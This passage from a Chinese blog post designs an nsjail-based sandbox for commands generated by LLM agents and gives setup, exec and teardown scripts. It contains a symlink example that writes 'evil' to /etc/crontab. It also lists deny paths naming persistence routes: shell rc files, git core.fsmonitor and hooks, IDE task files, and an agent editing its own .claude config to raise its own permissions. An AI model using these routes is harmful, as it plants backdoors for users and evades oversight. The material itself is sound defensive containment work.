+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nsjail --cap-drop ALL \</span><br><span class="line">       --disable_clone_newuser</span><br><span class="line"><span class="comment"># no_new_privs 默认开启，无需显式传参</span></span><br></pre></td></tr></table></figure>
+<p>核心目标：即使沙盒内进程被完全控制，也无法获得新的宿主机权限。</p>
+<h3 id="符号链接行为">符号链接行为</h3>
+<p>在 mount namespace 与 chroot 正确配置的前提下，符号链接解析会被限制在沙盒根目录视图内。</p>
+<p>例如 LLM 创建：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /etc/crontab /workspace/link</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;evil&quot;</span> &gt; /workspace/link</span><br></pre></td></tr></table></figure>
+<p>在沙盒中，<code>/workspace/link -&gt; /etc/crontab</code> 的实际解析目标是 <code>/sandbox/{sessionId}/etc/crontab</code>，而不是宿主机真实 <code>/etc/crontab</code>。这个文件在沙盒内通常不存在（<code>/etc</code> 是只读 bind 进来的副本），写入会 ENOENT 失败或在沙盒内创建无效文件。</p>
+<p>因此，相比仅依赖路径字符串校验的方案，<code>chroot + namespace</code> 对常见符号链接逃逸攻击<strong>更稳健</strong>。</p>
+<p>但仍需注意：</p>
+<ul>
+<li>需关闭 inherited file descriptor</li>
+<li>需隔离 <code>/proc</code>（已通过 <code>--disable_proc</code> 处理）</li>
+<li>需避免 mount namespace 泄漏</li>
+</ul>
+<p>否则仍可能出现越界访问问题。</p>
+<h3 id="强制拒绝路径">强制拒绝路径</h3>
+<p>有些路径无论怎么配都<strong>不应该被沙盒进程写入</strong>，这些是硬编码的：</p>
+<ul>
+<li>Shell 配置（<code>.bashrc</code>、<code>.zshrc</code>、<code>.profile</code>）：如果 LLM 能写这些文件，下次用户打开终端时注入的恶意命令就会自动执行——<strong>一次写入，永久驻留</strong>。这是最危险的持久化途径。</li>
+<li>Git 配置（<code>.gitconfig</code>、<code>.gitmodules</code>）：Git 有一个 <code>core.fsmonitor</code> 配置项，可以指定任意命令在每次 git 操作时执行。如果 LLM 改了这个配置，用户在沙盒外 <code>git commit</code> 时就会触发恶意代码。</li>
+<li>Git hooks（<code>.git/hooks/</code>）：<code>pre-commit</code>、<code>post-checkout</code> 等 hook 脚本天然就是&quot;在特定时机执行代码&quot;的设计，不可能让它可写。</li>
+<li>IDE 目录（<code>.vscode/</code>、<code>.idea/</code>）：IDE 的任务配置、启动脚本可以被篡改，下次打开项目时自动执行恶意代码。</li>
+<li>AI 助手自身配置（<code>.claude/commands/</code>、<code>.claude/agents/</code>）：如果 LLM 可以修改自己的配置或指令，它能&quot;自我升级权限&quot;，这是必须封堵的后门。</li>
+</ul>
+<p>这些路径写入优先级最高——即使出现在 <code>allowWrite</code> 白名单中也被覆盖拒绝，属于&quot;连沙盒自己都不信任沙盒内的 LLM&quot;。</p>
+<h3 id="按平台适配">按平台适配</h3>
+<p>OS 沙盒的底层原语是平台相关的：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Linux</th>
+<th>macOS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件隔离 + 资源限制</td>
+<td>nsjail (mount namespace + chroot + cgroup)</td>
+<td>Seatbelt (<code>sandbox-exec</code> + Scheme 沙盒策略文件)</td>
+</tr>
+<tr>
+<td>网络控制</td>
+<td>独立 network namespace + socat 桥接代理</td>
+<td>Seatbelt 内置（<code>network-outbound</code> 限制）</td>
+</tr>
+<tr>
+<td>系统调用过滤</td>
+<td>seccomp BPF（默认 deny + allowlist）</td>
+<td>Seatbelt 内置（mach-lookup 白名单）</td>
+</tr>
+<tr>
+<td>安全模型</td>
+<td>namespace + seccomp + capability drop + cgroup 组合</td>
+<td><code>(deny default)</code> + 逐条 <code>(allow ...)</code> 放行</td>
+</tr>
+</tbody>
+</table>
+<p>两个平台用各自的工具链，上层配置模型保持一致即可。跨平台的 AI 沙盒本质上是<strong>一份 config，两份 impl</strong>。</p>
+<h3 id="性能与隔离的权衡">性能与隔离的权衡</h3>
+<p>不同沙盒方案的隔离级别和适用场景各不相同：</p>
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>隔离级别</th>
+<th>性能</th>
+<th>启动速度</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nsjail</td>
+<td>namespace 级</td>
+<td>极高</td>
+<td>毫秒级</td>
+<td>AI Agent / 在线判题</td>
+</tr>
+<tr>
+<td>Docker</td>
+<td>container 级</td>
+<td>高</td>
+<td>秒级</td>
+<td>通用开发环境</td>
+</tr>
+<tr>
+<td>gVisor</td>
+<td>用户态内核</td>
+<td>中</td>
+<td>较快</td>
+<td>公网多租户</td>
+</tr>
+<tr>
+<td>Firecracker</td>
+<td>microVM</td>
+<td>较强</td>
+<td>较慢</td>
+<td>高安全隔离</td>
+</tr>
+</tbody>
+</table>
+<p>本文方案偏向：</p>
+<blockquote>
+<p><strong>高密度、低延迟、轻量级 AI Agent 执行环境。</strong></p>
+</blockquote>
+<p>其目标不是替代虚拟机，而是在性能与安全之间取得工程平衡。对公网多租户等更高安全需求的场景，可进一步演进为 gVisor 或 microVM 架构。工程上不存在绝对安全的沙盒，真正可行的方案是在性能、兼容性、隔离强度、运维复杂度之间做权衡。</p>
+<h3 id="防御全景">防御全景</h3>
+<pre><code class="highlight mermaid">flowchart TD
+    CMD[&quot;LLM 生成的命令&quot;] --&gt; L1
+    subgraph L1[&quot;第1层：文件与权限隔离&quot;]
+        NS[&quot;nsjail: mount namespace + chroot&lt;br/&gt;capability drop · no_new_privs · cgroup 限制&lt;br/&gt;防：rm -rf / · 提权 · 资源耗尽&quot;]
+    end
+    L1 --&gt; L2
+    subgraph L2[&quot;第2层：网络控制&quot;]
+        NET[&quot;独立 network namespace + HTTP/SOCKS 代理&lt;br/&gt;域名白名单 · fail-closed&lt;br/&gt;防：数据外传 · 下载恶意脚本 · C2 回调&quot;]
+    end
+    L2 --&gt; L3
+    subgraph L3[&quot;第3层：系统调用过滤&quot;]
+        SEC[&quot;seccomp BPF (默认 deny + allowlist)&lt;br/&gt;禁用 AF_UNIX · io_uring · bpf&lt;br/&gt;防：Unix socket 绕过 · 内核弱点旁路&quot;]
+    end
+    L3 --&gt; L4
+    subgraph L4[&quot;第4层：路径兜底&quot;]
+        DENY[&quot;强制拒绝路径&lt;br/&gt;符号链接解析受限 (chroot + namespace)&lt;br/&gt;.bashrc .gitconfig .git/hooks/ …&lt;br/&gt;防：持久化后门 · git 劫持&quot;]
+    end
+    L4 --&gt; SAFE[&quot;安全执行&lt;br/&gt;攻击面层层收窄&quot;]</code></pre>
+<blockquote>
+<p>以上实践参考了 Anthropic <a target="_blank" rel="noopener" href="https://github.com/anthropic-experimental/sandbox-runtime">sandbox-runtime</a> 的架构设计。</p>
+</blockquote>
+<h1>会话生命周期</h1>
+<p>每个用户会话（一次对话 / 一个工作流实例）对应一个独立的沙盒工作区：</p>
+<pre><code class="highlight mermaid">sequenceDiagram
+    participant 调用方
+    participant 沙盒服务
+    participant 文件系统
+
+    调用方-&gt;&gt;沙盒服务: exec(command)
+    沙盒服务-&gt;&gt;沙盒服务: 检测到无会话
+    沙盒服务-&gt;&gt;文件系统: mkdir /sandbox/&#123;id&#125;/workspace
+    沙盒服务-&gt;&gt;文件系统: mkdir /sandbox/&#123;id&#125;/home
+    沙盒服务-&gt;&gt;文件系统: mkdir /sandbox/&#123;id&#125;/tmp
+    沙盒服务-&gt;&gt;文件系统: mount --bind /usr /lib /bin /etc /opt → chroot 树 (只读)
+    沙盒服务-&gt;&gt;沙盒服务: 持久化会话到 DB
+    沙盒服务-&gt;&gt;文件系统: nsjail 启动 · 执行 command
+    沙盒服务--&gt;&gt;调用方: ExecResult
+
+    调用方-&gt;&gt;沙盒服务: release(sessionId)
+    沙盒服务-&gt;&gt;文件系统: umount /sandbox/&#123;id&#125;/usr /lib /bin /etc /opt (必须先解绑)
+    沙盒服务-&gt;&gt;文件系统: rm -rf /sandbox/&#123;id&#125;
+    沙盒服务-&gt;&gt;沙盒服务: 标记会话已释放</code></pre>
+<p>关键设计点：</p>
+<ul>
+<li><strong>自动创建</strong>：首次执行命令时自动建工作区，不要求调用方显式管理</li>
+<li><strong>数据隔离</strong>：不同会话工作区完全独立，<code>/sandbox/alice-123/workspace</code> ≠ <code>/sandbox/bob-456/workspace</code></li>
+<li><strong>自动清理</strong>：会话结束 <code>rm -rf</code> 不留残留</li>
+<li><strong>可恢复</strong>：会话状态落库，服务重启后可重建</li>
+</ul>
+<h1>附录：可直接使用的沙盒脚本</h1>
+<p>以下三个脚本实现了上述完整方案，可直接部署使用。</p>
+<h3 id="前置依赖">前置依赖</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian/Ubuntu</span></span><br><span class="line">apt-get install -y nsjail socat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保内核支持 cgroup v2</span></span><br><span class="line">mount | grep cgroup2 || mount -t cgroup2 none /sys/fs/cgroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建沙盒根目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /sandbox</span><br></pre></td></tr></table></figure>
+<h3 id="sandbox-setup-—-准备沙盒环境">sandbox-setup — 准备沙盒环境</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># sandbox-setup.sh &lt;sessionId&gt;</span></span><br><span class="line"><span class="comment"># 准备沙盒目录树，bind 系统目录，完成后可反复执行命令</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">SESSION_ID=<span class="string">&quot;<span class="variable">$&#123;1:?Usage: $0 &lt;sessionId&gt;&#125;</span>&quot;</span></span><br><span class="line">SANDBOX_ROOT=<span class="string">&quot;/sandbox/<span class="variable">$&#123;SESSION_ID&#125;</span>&quot;</span></span><br><span class="line">USER_NAME=<span class="string">&quot;<span class="variable">$&#123;SUDO_USER:-$(whoami)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[sandbox-setup] <span class="variable">$SESSION_ID</span> 已存在，跳过创建&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[sandbox-setup] 创建沙盒: <span class="variable">$SESSION_ID</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/workspace&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/home/.local/bin&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/tmp&quot;</span></span><br><span class="line"><span class="built_in">chown</span> -R <span class="string">&quot;<span class="variable">$USER_NAME</span>:<span class="variable">$USER_NAME</span>&quot;</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/home&quot;</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/workspace&quot;</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/tmp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bind 系统目录 (只读)</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> usr lib bin etc opt; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/<span class="variable">$dir</span>&quot;</span></span><br><span class="line">    mount --<span class="built_in">bind</span> <span class="string">&quot;/<span class="variable">$dir</span>&quot;</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/<span class="variable">$dir</span>&quot;</span></span><br><span class="line">    mount -o remount,ro,<span class="built_in">bind</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/<span class="variable">$dir</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[sandbox-setup] 完成: <span class="variable">$SANDBOX_ROOT</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="sandbox-exec-—-执行命令">sandbox-exec — 执行命令</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># sandbox-exec.sh &lt;sessionId&gt; &lt;command&gt;</span></span><br><span class="line"><span class="comment"># 在指定沙盒中执行命令。如沙盒未初始化则自动调用 setup</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">SESSION_ID=<span class="string">&quot;<span class="variable">$&#123;1:?Usage: $0 &lt;sessionId&gt; &lt;command&gt;&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line">COMMAND=<span class="string">&quot;<span class="variable">$&#123;*:?Usage: $0 &lt;sessionId&gt; &lt;command&gt;&#125;</span>&quot;</span></span><br><span class="line">SANDBOX_ROOT=<span class="string">&quot;/sandbox/<span class="variable">$&#123;SESSION_ID&#125;</span>&quot;</span></span><br><span class="line">USER_NAME=<span class="string">&quot;<span class="variable">$&#123;SUDO_USER:-$(whoami)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动初始化</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[sandbox-exec] 沙盒未初始化，自动 setup...&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>/sandbox-setup.sh&quot;</span> <span class="string">&quot;<span class="variable">$SESSION_ID</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">MEM_LIMIT=<span class="string">&quot;<span class="variable">$&#123;SANDBOX_MEM_LIMIT:-536870912&#125;</span>&quot;</span>      <span class="comment"># 512MB</span></span><br><span class="line">CPU_LIMIT=<span class="string">&quot;<span class="variable">$&#123;SANDBOX_CPU_LIMIT:-800&#125;</span>&quot;</span>             <span class="comment"># 80%/core</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> nsjail --mode l \</span><br><span class="line">    --<span class="built_in">chroot</span> <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>&quot;</span> \</span><br><span class="line">    --cgroup_mem_max <span class="string">&quot;<span class="variable">$MEM_LIMIT</span>&quot;</span> \</span><br><span class="line">    --cgroup_cpu_ms_per_sec <span class="string">&quot;<span class="variable">$CPU_LIMIT</span>&quot;</span> \</span><br><span class="line">    --disable_proc \</span><br><span class="line">    --cap-drop ALL \</span><br><span class="line">    --time_limit 0 \</span><br><span class="line">    --<span class="built_in">env</span> HOME=<span class="string">&quot;/home/<span class="variable">$&#123;USER_NAME&#125;</span>&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> USER=<span class="string">&quot;<span class="variable">$USER_NAME</span>&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> TMPDIR=/tmp \</span><br><span class="line">    --<span class="built_in">env</span> LANG=C.UTF-8 \</span><br><span class="line">    --<span class="built_in">env</span> PATH=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/<span class="variable">$&#123;USER_NAME&#125;</span>/.local/bin&quot;</span> \</span><br><span class="line">    -- /bin/sh -c <span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="sandbox-teardown-—-删除沙盒">sandbox-teardown — 删除沙盒</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># sandbox-teardown.sh &lt;sessionId&gt;</span></span><br><span class="line"><span class="comment"># 解绑挂载并删除沙盒目录</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">SESSION_ID=<span class="string">&quot;<span class="variable">$&#123;1:?Usage: $0 &lt;sessionId&gt;&#125;</span>&quot;</span></span><br><span class="line">SANDBOX_ROOT=<span class="string">&quot;/sandbox/<span class="variable">$&#123;SESSION_ID&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[sandbox-teardown] <span class="variable">$SESSION_ID</span> 不存在&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[sandbox-teardown] 释放沙盒: <span class="variable">$SESSION_ID</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先 umount（顺序不重要，但必须在 rm 之前）</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> usr lib bin etc opt; <span class="keyword">do</span></span><br><span class="line">    mountpoint -q <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/<span class="variable">$dir</span>&quot;</span> 2&gt;/dev/null &amp;&amp; umount <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>/<span class="variable">$dir</span>&quot;</span> || <span class="literal">true</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再删除</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$SANDBOX_ROOT</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[sandbox-teardown] 完成&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用示例">使用示例</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 准备沙盒</span></span><br><span class="line"><span class="built_in">sudo</span> ./sandbox-setup.sh session-abc123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令（沙盒内执行 pip install）</span></span><br><span class="line">./sandbox-exec.sh session-abc123 <span class="string">&quot;pip install numpy pandas&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行多条命令</span></span><br><span class="line">./sandbox-exec.sh session-abc123 <span class="string">&quot;cd /workspace &amp;&amp; python -c &#x27;import numpy; print(numpy.__version__)&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理</span></span><br><span class="line"><span class="built_in">sudo</span> ./sandbox-teardown.sh session-abc123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 Java/Go 调用：直接用 ProcessBuilder / exec.Command</span></span><br><span class="line"><span class="comment"># 无需额外封装，三个脚本本身就是沙盒 API</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>注意</strong>：<code>sandbox-setup</code> 和 <code>sandbox-teardown</code> 中的 <code>mount</code>/<code>umount</code> 需要 root 权限。执行命令的 <code>sandbox-exec</code> 中 nsjail 的 chroot 和 cgroup 也需要 root，如果不想用 root，可以给 nsjail 二进制设置 <code>CAP_SYS_ADMIN</code> + <code>CAP_SYS_CHROOT</code> capability。</p>
+</blockquote>
+<h1>总结</h1>
+<p>一套可落地的 AI 沙盒设计，核心抓住这几点：</p>
+<ol>
+<li><strong>关注点解耦</strong>：传输方式与隔离级别各写一份实现，按需组合</li>
+<li><strong>轻量高效</strong>：nsjail 提供了优秀的 namespace/cgroup 封装，配合独立 home 支撑 pip/npm 等工具链，启动毫秒级，适合高密度 AI Agent 场景</li>
+<li><strong>纵深防护</strong>：namespace + chroot + seccomp + capability drop + cgroup + 强制拒绝路径，多道防线协同，不依赖单点</li>
+<li><strong>透明生命周期</strong>：自动创建、自动清理、会话隔离、状态可恢复</li>
+</ol>
+<p>需要明确的是：这不是 VM 级强隔离。真正的安全依赖 namespace / seccomp / capability / cgroup 的组合。对公网多租户场景，可进一步升级为 gVisor 或 microVM 架构。工程上不存在绝对安全的沙盒，真正可行的方案是在性能、兼容性、隔离强度、运维复杂度之间做平衡。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AI/">AI</a><a class="post-meta__tags" href="/tags/%E6%B2%99%E7%9B%92/">沙盒</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/">架构设计</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/%E4%B8%80%E6%AC%A1Claude-Code%E7%BC%93%E5%AD%98%E5%B4%A9%E6%BA%83%E7%9A%84%E5%AE%8C%E6%95%B4%E6%BA%AF%E6%BA%90.html" title="一次 Claude Code 缓存崩溃的完整溯源——从 99% 暴跌到 0.4% 的数据→源码→验证之旅"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">一次 Claude Code 缓存崩溃的完整溯源——从 99% 暴跌到 0.4% 的数据→源码→验证之旅</div></div><div class="info-2"><div class="info-item-1">背景 用 Claude Code 对接 DeepSeek V4 的 Anthropic 兼容接口，发现缓存命中率偶尔脉冲式突变：同一轮对话中从 99%+ 暴跌到 0.5%，下一轮自动恢复。 123410:11:23  cache=122,368/123,641  99.0%10:11:45  cache=  1,536/119,826   1.3%  ← 暴跌10:11:57  cache=  6,528/123,795   5.3%10:12:18  cache=124,288/124,430  99.9%  ← 恢复 根因 Claude Code 的 system prompt 末尾嵌入了 git status 快照： 123456system[0]: &quot;You are Claude Code...&quot;         ← cache_control 断点system[1]: CLAUDE.md + 工具定义 + ...       ← cache_control 断点           gitStatus:                        ...</div></div></div></a><a class="pagination-related" href="/2026/Chrome%E7%BF%BB%E8%AF%91%E5%BC%BA%E5%88%B6%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88.html" title="Chrome 翻译强制代理方案"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Chrome 翻译强制代理方案</div></div><div class="info-2"><div class="info-item-1">背景 Chrome 浏览器的内置翻译功能需要直连 Google 服务。只有在开启 Clash 的系统代理或 TUN 模式（全局代理）时，翻译功能才能正常工作。 但我的日常习惯是不开系统代理或 TUN 模式，避免影响其他软件的网络行为。浏览器流量通过 ZeroOmega 插件经 SOCKS5 代理转发到 Clash。 问题在于：ZeroOmega 只能代理网页内容请求，Chrome 内置的翻译请求不经过插件，因此无法使用翻译功能。  解决方案参考：SwitchyOmega/issues/264  原理 核心思路分两步：  hosts 劫持：将 Google 翻译域名指向本地回环地址，让翻译请求发往本机 Clash 隧道转发：Clash 监听本地对应端口，将收到的流量通过代理转发到真正的目标服务器  基础方案 步骤 1：修改 hosts 12127.0.0.1  translate.google.com127.0.0.1  translate.googleapis.com 步骤 2：配置 Clash 隧道 在 Clash 配置文件中添加： 12tunnels:  - tcp,127....</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">codexvn</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/codexvn"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">分层设计：传输与隔离解耦</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">隔离模型：简单而高效的设计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9Amount-namespace-chroot-%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">原理：mount namespace + chroot + 资源限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%80%89%E6%8B%A9-chroot-namespace%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">为什么选择 chroot + namespace？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E7%8B%AC%E7%AB%8B%E7%9A%84-Home-%E7%9B%AE%E5%BD%95%EF%BC%9F"><span class="toc-number">3.3.</span> <span class="toc-text">为什么需要独立的 Home 目录？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Home-%E7%9B%AE%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.4.</span> <span class="toc-text">Home 目录初始化步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">3.5.</span> <span class="toc-text">最终目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">3.6.</span> <span class="toc-text">攻击场景验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span 